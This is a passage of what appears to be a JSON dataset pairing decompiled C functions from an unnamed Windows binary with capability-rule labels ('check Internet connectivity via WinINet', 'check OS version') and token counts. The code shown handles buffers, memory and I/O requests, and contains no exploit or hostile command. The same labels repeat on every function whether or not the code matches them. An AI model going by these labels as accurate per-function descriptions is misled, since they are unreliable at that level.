  if (var_4h != 0) {\n        fcn.00078544(var_4h);\n    }\n    if (*(arg_8h + 300) != 0) {\n        *(arg_8h + 300) = 0;\n    }\n    var_4h = *(arg_8h + 0x14);\n    *(arg_8h + 0x14) = 0;\n    if (var_4h != 0) {\n        fcn.00078544(var_4h);\n        fcn.00034550(arg_8h + 0x18);\n        fcn.000345c0(arg_8h + 0x18);\n    }\n    return;\n}\n",
        "token_count": 892
    },
    "00065c60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00065c60(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 0x124) != 0) {\n        fcn.00034520(arg_8h + 0x18);\n    }\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 73
    },
    "00065c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00065da1)\n// WARNING: Removing unreachable block (ram,0x00065d96)\n// WARNING: Removing unreachable block (ram,0x00065db7)\n// WARNING: Removing unreachable block (ram,0x00065cfe)\n// WARNING: Removing unreachable block (ram,0x00065d2e)\n// WARNING: Removing unreachable block (ram,0x00065d35)\n// WARNING: Removing unreachable block (ram,0x00065d3e)\n// WARNING: Removing unreachable block (ram,0x00065d50)\n// WARNING: Removing unreachable block (ram,0x00065d59)\n// WARNING: Removing unreachable block (ram,0x00065d69)\n\nuint __cdecl fcn.00065c90(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = *(arg_8h + 0xe0);\n    var_14h = arg_8h + 0x9e;\n    uVar2 = *(*(arg_8h + 8) + 4);\n    var_10h = (**0xb1bde230)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n    if (var_10h == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        iVar1 = *(var_10h + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(var_10h + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 3;\n        *(iVar1 + -0x10) = uVar2;\n        *(iVar1 + -0xc) = *(arg_8h + 8);\n        *(iVar1 + -0x1c) = &var_28h;\n        *(iVar1 + -0x18) = 0;\n        *(iVar1 + -0x14) = 0;\n        var_ch = fcn.00078160(var_10h, uVar2, &var_8h, 0xffffffff);\n        if (var_ch == -0x3ffffdca) {\n            uVar2 = 0x21590003;\n        }\n        else {\n            *(arg_8h + 300) = 1;\n            if (*(arg_8h + 0x130) != 0) {\n                fcn.00066b60(arg_8h);\n            }\n            uVar2 = fcn.000785b6(var_ch);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 768
    },
    "00065e80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000662b9)\n// WARNING: Removing unreachable block (ram,0x00065fd3)\n// WARNING: Removing unreachable block (ram,0x0006600f)\n// WARNING: Removing unreachable block (ram,0x00066019)\n// WARNING: Removing unreachable block (ram,0x00066022)\n// WARNING: Removing unreachable block (ram,0x0006603a)\n// WARNING: Removing unreachable block (ram,0x00066043)\n// WARNING: Removing unreachable block (ram,0x00066059)\n// WARNING: Removing unreachable block (ram,0x000660bc)\n// WARNING: Removing unreachable block (ram,0x00066092)\n// WARNING: Removing unreachable block (ram,0x000660a0)\n// WARNING: Removing unreachable block (ram,0x000662ab)\n// WARNING: Removing unreachable block (ram,0x000662d6)\n// WARNING: Removing unreachable block (ram,0x000661eb)\n// WARNING: Removing unreachable block (ram,0x00066227)\n// WARNING: Removing unreachable block (ram,0x00066231)\n// WARNING: Removing unreachable block (ram,0x0006623a)\n// WARNING: Removing unreachable block (ram,0x00066253)\n// WARNING: Removing unreachable block (ram,0x0006625c)\n// WARNING: Removing unreachable block (ram,0x00066272)\n\nint32_t __cdecl fcn.00065e80(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_bch;\n    int16_t *var_b8h;\n    int16_t *var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    if (*(arg_8h + 0x128) == -1) {\n        var_70h = 0x21590065;\n    }\n    else {\n        var_74h = fcn.00035200(0x140);\n        if (var_74h == 0) {\n            var_70h = 0x21590004;\n        }\n        else {\n            fcn.00034550(arg_8h + 0x18);\n            fcn.00078790(var_74h, 0, 0x140);\n            var_b4h = arg_8h + 0x1e;\n            var_b8h = var_74h + 0x1e;\n            do {\n                iVar1 = *var_b4h;\n                *var_b8h = iVar1;\n                var_b4h = var_b4h + 1;\n                var_b8h = var_b8h + 1;\n            } while (iVar1 != 0);\n            uVar4 = fcn.000782f0(var_74h + 0x1e, var_74h + 4, var_74h + 8);\n            var_ch = uVar4;\n            if (uVar4 == 0) {\n                *(arg_8h + 0x14) = *(var_74h + 4);\n                uVar2 = *(*(var_74h + 8) + 4);\n                uVar4 = 0;\n                var_6ch = (**0xb1bde230)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n                if (var_6ch == 0) {\n                    var_70h = 0x21590004;\n                }\n                else {\n                    iVar3 = *(var_6ch + 0x60);\n                    *(iVar3 + -8) = 0;\n                    *(iVar3 + -4) = 0;\n                    *(iVar3 + -0x21) = 0;\n                    iVar3 = *(var_6ch + 0x60);\n                    *(iVar3 + -0x24) = 0xf;\n                    *(iVar3 + -0x23) = 1;\n                    *(iVar3 + -0x10) = uVar2;\n                    *(iVar3 + -0xc) = *(var_74h + 8);\n                    *(iVar3 + -0x20) = *(arg_8h + 0xc);\n                    uVar4 = fcn.00078160(var_6ch, uVar2, &fcn.00065e80::var_8h, 0xffffffff);\n                    var_ch = uVar4;\n                    if (uVar4 == 0) {\n                        var_8ch = 0;\n                        var_88h = 0;\n                        var_84h = 0;\n                        var_80h = 0;\n                        var_7ch = 0;\n                        var_78h = 0;\n                        var_24h = 0;\n                        var_20h = 0;\n                        var_1ch = 0;\n                        var_18h = 0;\n                        var_10h = &fcn.00065e80::var_68h;\n                        var_14h = 0x40;\n                        uVar2 = *(*(var_74h + 8) + 4);\n                        var_6ch = (**0xb1bde230)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n                        if (var_6ch == 0) {\n                            uVar4 = var_ch;\n                            var_70h = fcn.000785b6();\n                        }\n                        else {\n                            iVar3 = *(var_6ch + 0x60);\n                            *(iVar3 + -8) = 0;\n                            *(iVar3 + -4) = 0;\n                            *(iVar3 + -0x21) = 0;\n                            iVar3 = *(var_6ch + 0x60);\n                            *(iVar3 + -0x24) = 0xf;\n                            *(iVar3 + -0x23) = 4;\n                            *(iVar3 + -0x10) = uVar2;\n                            *(iVar3 + -0xc) = *(var_74h + 8);\n                            *(iVar3 + -0x20) = 0;\n                            *(iVar3 + -0x1c) = &fcn.00065e80::var_8ch;\n                            *(iVar3 + -0x18) = &fcn.00065e80::var_24h;\n                            uVar4 = 0x66378;\n                            uVar5 = fcn.00078160(0x66378, uVar2, &fcn.00065e80::var_8h, 0xffffffff);\n                            var_ch = uVar5;\n                            if (*(arg_8h + 0x14) == 0) {\n                                var_70h = 0x21590006;\n                            }\n                            else if (uVar5 == 0) {\n                                *(var_74h + 0x128) = 0xffffffff;\n                                if (var_14h < 0x41) {\n                                    uVar4 = var_14h;\n                                    fcn.0007877e(var_74h + 0x9e, var_10h, var_14h);\n                                    *(var_74h + 0xe0) = var_14h;\n                                }\n                                *arg_ch = var_74h;\n                                var_70h = 0;\n                            }\n                            else {\n                                var_70h = fcn.000785b6(uVar5);\n                                uVar4 = uVar5;\n                            }\n                        }\n                    }\n                    else {\n                        var_70h = fcn.000785b6();\n                    }\n                }\n            }\n            else {\n                var_70h = fcn.000785b6(uVar4);\n            }\n            if ((var_70h != 0) && (var_74h != 0)) {\n                if (*(var_74h + 4) != 0) {\n                    fcn.00078544(*(var_74h + 4), uVar4);\n                }\n                fcn.00035330(var_74h);\n            }\n            *(arg_8h + 0x14) = 0;\n            fcn.000345c0(arg_8h + 0x18);\n        }\n    }\n    return var_70h;\n}\n",
        "token_count": 2024
    },
    "000664f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0006667b)\n// WARNING: Removing unreachable block (ram,0x00066670)\n// WARNING: Removing unreachable block (ram,0x00066691)\n// WARNING: Removing unreachable block (ram,0x000665d8)\n// WARNING: Removing unreachable block (ram,0x00066608)\n// WARNING: Removing unreachable block (ram,0x0006660f)\n// WARNING: Removing unreachable block (ram,0x00066618)\n// WARNING: Removing unreachable block (ram,0x0006662a)\n// WARNING: Removing unreachable block (ram,0x00066633)\n// WARNING: Removing unreachable block (ram,0x00066643)\n\nuint fcn.000664f0(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_ch;\n    int32_t var_10h;\n    uint var_18h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c457c8;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffac;\n    if (var_10h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(*(var_8h + 8) + 4);\n        arg_8h = (**0xb1bde230)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_8h == 0) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            iVar3 = (**0xb1bde294)(var_ch, var_10h, 0, 0, arg_8h);\n            if (iVar3 == 0) {\n                (**0xb1bde2ec)();\n                uVar2 = 0x21590004;\n            }\n            else {\n                var_4h = 0;\n                (**0xb1bde2a0)(iVar3, 0, 0);\n                var_4h = 0xffffffff;\n                iVar1 = *(arg_8h + 0x60);\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -4) = 0;\n                *(iVar1 + -0x21) = 0;\n                iVar1 = *(arg_8h + 0x60);\n                *(iVar1 + -0x24) = 0xf;\n                *(iVar1 + -0x23) = 7;\n                *(iVar1 + -0x10) = uVar2;\n                *(iVar1 + -0xc) = *(var_8h + 8);\n                *(iVar1 + -0x1c) = 0;\n                *(iVar1 + -0x20) = var_10h;\n                *(arg_8h + 4) = iVar3;\n                uVar2 = fcn.00078160(arg_8h, uVar2, &var_20h, 0xffffffff);\n                uVar2 = fcn.000785b6(uVar2);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 893
    },
    "00066730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00066837)\n// WARNING: Removing unreachable block (ram,0x00066867)\n// WARNING: Removing unreachable block (ram,0x0006686e)\n// WARNING: Removing unreachable block (ram,0x00066877)\n// WARNING: Removing unreachable block (ram,0x0006688a)\n// WARNING: Removing unreachable block (ram,0x00066893)\n// WARNING: Removing unreachable block (ram,0x000668a3)\n// WARNING: Removing unreachable block (ram,0x000668d0)\n// WARNING: Removing unreachable block (ram,0x000668db)\n// WARNING: Removing unreachable block (ram,0x000668f2)\n\nuint fcn.00066730(int32_t param_1, int32_t param_2, int32_t *param_3, uint param_4, uint32_t param_5)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    int32_t *var_10h;\n    uint var_14h;\n    uint32_t var_18h_2;\n    uint var_18h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c457b8;\n    uStack16 = 0xb1c4578a;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffa8;\n    if (*var_10h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(*(var_8h + 8) + 4);\n        var_30h = 0;\n        do {\n            if (*var_10h <= var_30h) break;\n            iVar3 = (**0xb1bde230)(3, uVar2, 0, 0, 0, 0, 1, 0, 0);\n            if (iVar3 == 0) {\n                uVar2 = 0x21590004;\n                goto code_r0x000669c3;\n            }\n            iVar4 = (**0xb1bde294)(var_ch + var_30h, *var_10h - var_30h, 0, 0, iVar3);\n            if (iVar4 == 0) {\n                (**0xb1bde2ec)();\n                uVar2 = 0x21590004;\n                goto code_r0x000669c3;\n            }\n            var_4h = 0;\n            (**0xb1bde2a0)(iVar4, 0, 2);\n            var_4h = 0xffffffff;\n            iVar1 = *(iVar3 + 0x60);\n            *(iVar1 + -8) = 0;\n            *(iVar1 + -4) = 0;\n            *(iVar1 + -0x21) = 0;\n            iVar1 = *(iVar3 + 0x60);\n            *(iVar1 + -0x24) = 0xf;\n            *(iVar1 + -0x23) = 8;\n            *(iVar1 + -0x10) = uVar2;\n            *(iVar1 + -0xc) = *(var_8h + 8);\n            *(iVar1 + -0x1c) = 0;\n            *(iVar1 + -0x20) = *var_10h - var_30h;\n            *(iVar3 + 4) = iVar4;\n            iVar3 = fcn.00078160(iVar3, uVar2, &var_20h, var_14h);\n            if (iVar3 != 0) {\n                if (iVar3 == 0x102) {\n                    uVar2 = 0x21590002;\n                }\n                else {\n                    uVar2 = fcn.000785b6(iVar3);\n                }\n                goto code_r0x000669c3;\n            }\n            if (var_1ch == 0) {\n                uVar2 = 0x21590003;\n                goto code_r0x000669c3;\n            }\n            var_30h = var_30h + var_1ch;\n        } while ((var_18h_2 & 1) != 0);\n        *var_10h = var_30h;\n        uVar2 = 0;\n    }\ncode_r0x000669c3:\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 1143
    },
    "000669f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000669f0(int32_t arg_8h, int32_t arg_ch, char **arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint uVar3;\n    uint32_t in_EDX;\n    uint var_48h;\n    char **var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    if ((arg_ch == 4) || (arg_ch == 3)) {\n        uVar2 = fcn.000354c0(in_EDX & 0xffff0000 | *(arg_8h + 0xa6));\n        fcn.0007865e(&var_18h, 0xb1be2868, *(arg_8h + 0xa8), *(arg_8h + 0xa9), *(arg_8h + 0xaa), *(arg_8h + 0xab), uVar2\n                    );\n        if (arg_ch == 3) {\n            if (arg_14h != 0x4) {\n                return 0x21590064;\n            }\n            var_20h = &var_18h;\n            do {\n                cVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (cVar1 != '\\0');\n            *arg_10h = var_20h + (1 - (&var_18h + 1));\n        }\n        else {\n            if (arg_14h < 1) {\n                return 0x21590064;\n            }\n            var_30h = &var_18h;\n            do {\n                cVar1 = *var_30h;\n                var_30h = var_30h + 1;\n            } while (cVar1 != '\\0');\n            if (arg_14h < var_30h + (1 - (&var_18h + 1))) {\n                fcn.00078652(arg_10h, &var_18h, arg_14h + -1);\n                *(arg_10h + arg_14h + -1) = '\\0';\n            }\n            else {\n                var_40h = &var_18h;\n                var_44h = arg_10h;\n                do {\n                    cVar1 = *var_40h;\n                    *var_44h = cVar1;\n                    var_40h = var_40h + 1;\n                    var_44h = var_44h + 1;\n                } while (cVar1 != '\\0');\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x21590001;\n    }\n    return uVar3;\n}\n",
        "token_count": 659
    },
    "00066bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00066bb0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x30);\n    if (arg_8h_00 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, 0x30);\n        var_8h = arg_ch;\n        var_4h = 0;\n        iVar1 = fcn.00075a40(arg_8h_00 + 4, &var_8h, arg_10h, arg_14h, 0, 0, (arg_18h & 1) != 0);\n        if (iVar1 == 0) {\n            *(arg_8h_00 + 0xc) = 1;\n            fcn.000344f0(arg_8h_00 + 0x14);\n            fcn.000344f0(arg_8h_00 + 0x18);\n            fcn.000344f0(arg_8h_00 + 0x1c);\n            *arg_8h = arg_8h_00;\n            iVar1 = 0;\n        }\n        else {\n            fcn.00035330(arg_8h_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 375
    },
    "00066c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00066c90(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x30);\n    if (arg_8h_00 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, 0x30);\n        uVar2 = fcn.00035200(arg_14h);\n        *(arg_8h_00 + 0x20) = uVar2;\n        if (*(arg_8h_00 + 0x20) == 0) {\n            fcn.00035330(arg_8h_00);\n            iVar1 = 0x21590004;\n        }\n        else {\n            fcn.0007877e(*(arg_8h_00 + 0x20), arg_10h, arg_14h);\n            *(arg_8h_00 + 0x24) = arg_14h;\n            *(arg_8h_00 + 0x28) = arg_18h;\n            uVar2 = fcn.00035360(arg_ch);\n            *(arg_8h_00 + 0x2c) = uVar2;\n            if (*(arg_8h_00 + 0x2c) == 0) {\n                fcn.00035330(*(arg_8h_00 + 0x20));\n                fcn.00035330(arg_8h_00);\n                iVar1 = 0x21590004;\n            }\n            else {\n                var_8h = arg_ch;\n                var_4h = 0;\n                iVar1 = fcn.00075a40(arg_8h_00 + 8, &var_8h, 0, 0, arg_10h, arg_14h, -((arg_18h & 1) != 0) & 2);\n                if (iVar1 == 0) {\n                    *(arg_8h_00 + 0xc) = 0;\n                    fcn.000344f0(arg_8h_00 + 0x14);\n                    fcn.000344f0(arg_8h_00 + 0x18);\n                    *arg_8h = arg_8h_00;\n                    iVar1 = 0;\n                }\n                else {\n                    fcn.00035330(arg_8h_00);\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 630
    },
    "00066e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00066e10(int32_t arg_8h)\n\n{\n    fcn.00034520(arg_8h + 0x18);\n    fcn.00034520(arg_8h + 0x14);\n    if (*(arg_8h + 0xc) != 0) {\n        fcn.00034520(arg_8h + 0x1c);\n    }\n    fcn.00035330(*(arg_8h + 0x20));\n    fcn.00035330(*(arg_8h + 0x2c));\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 144
    },
    "00066e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00066e70(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (*(arg_8h + 4) != 0) {\n        var_8h = fcn.00076270(*(arg_8h + 4), arg_ch, 0);\n    }\n    if (*(arg_8h + 8) != 0) {\n        var_4h = fcn.00076270(*(arg_8h + 8), arg_ch, 0);\n    }\n    if (var_8h == 0) {\n        var_ch = var_4h;\n    }\n    else {\n        var_ch = var_8h;\n    }\n    return var_ch;\n}\n",
        "token_count": 203
    },
    "00066ee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00066ee0(int32_t arg_8h, uint arg_ch)\n\n{\n    if (*(arg_8h + 8) == 0) {\n        fcn.000761b0(*(arg_8h + 4), arg_ch, 0);\n    }\n    else {\n        fcn.000761b0(*(arg_8h + 8), arg_ch, 0);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00066f20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00066f20(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    if (*(arg_8h + 8) == 0) {\n        if (*(arg_8h + 4) == 0) {\n            fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            fcn.00076010(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    else {\n        fcn.00076010(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00066f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00066f90(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0x21590001;\n    var_4h = 0x21590001;\n    if (*(arg_8h + 4) != 0) {\n        var_8h = fcn.000766a0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, 0);\n    }\n    if (*(arg_8h + 8) != 0) {\n        var_4h = fcn.000766a0(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, 0);\n    }\n    if (var_8h == 0) {\n        var_ch = var_8h;\n    }\n    else {\n        var_ch = var_4h;\n    }\n    return var_ch;\n}\n",
        "token_count": 245
    },
    "00067010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067010(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (*(arg_8h + 8) == 0) {\n        fcn.00076770(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, 0);\n    }\n    else {\n        fcn.00076770(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, 0);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "00067160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00067160(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint8_t **arg_14h, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint *var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint8_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_10h = NULL;\n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 0x10) == 0) {\n            if (*(arg_8h + 8) == 0) {\n                var_ch = *(arg_8h + 0x2c);\n                var_8h = 0;\n                var_18h = fcn.00075a40(arg_8h + 8, &var_ch, 0, 0, *(arg_8h + 0x20), *(arg_8h + 0x24), \n                                       -((*(arg_8h + 0x28) & 1) != 0) & 2);\n                if (var_18h != 0) {\n                    return var_18h;\n                }\n            }\n            if ((arg_1ch != 0) && (arg_20h == 0)) {\n                return 0x21590002;\n            }\n            var_18h = fcn.000760f0(*(arg_8h + 8), 0);\n            if (var_18h != 0) {\n                fcn.00075d60(arg_8h + 8, 0);\n                return var_18h;\n            }\n            *(arg_8h + 0x10) = 1;\n        }\n    }\n    else if (*(arg_8h + 8) == 0) {\n        if ((arg_1ch != 0) && (arg_20h == 0)) {\n            return 0x21590002;\n        }\n        fcn.00034550(arg_8h + 0x1c);\n        if (*(arg_8h + 8) == 0) {\n            var_18h = fcn.00075e70(*(arg_8h + 4), arg_8h + 8, 0);\n        }\n        else {\n            var_18h = 0;\n        }\n        fcn.000345c0(arg_8h + 0x1c);\n        if (var_18h != 0) {\n            return var_18h;\n        }\n    }\n    var_18h = 0x21590064;\n    if (arg_ch != 0) {\n        var_2ch = 0;\n        var_1ch = 0;\n        var_2h._0_1_ = 0x90;\n        var_34h = &var_2h;\n        var_30h = 1;\n        var_38h = &var_28h;\n        var_24h = arg_10h;\n        var_20h = 0x90;\n        var_28h = arg_ch;\n        var_18h = fcn.00076840(*(arg_8h + 8), &var_38h, 0);\n        if (var_18h != 0) goto code_r0x00067434;\n    }\n    if (arg_1ch != 0) {\n        var_18h = fcn.000763f0(*(arg_8h + 8), &var_10h, &var_14h, arg_20h, 0);\n        if (var_18h == 0) {\n            if (var_14h < 1) {\n         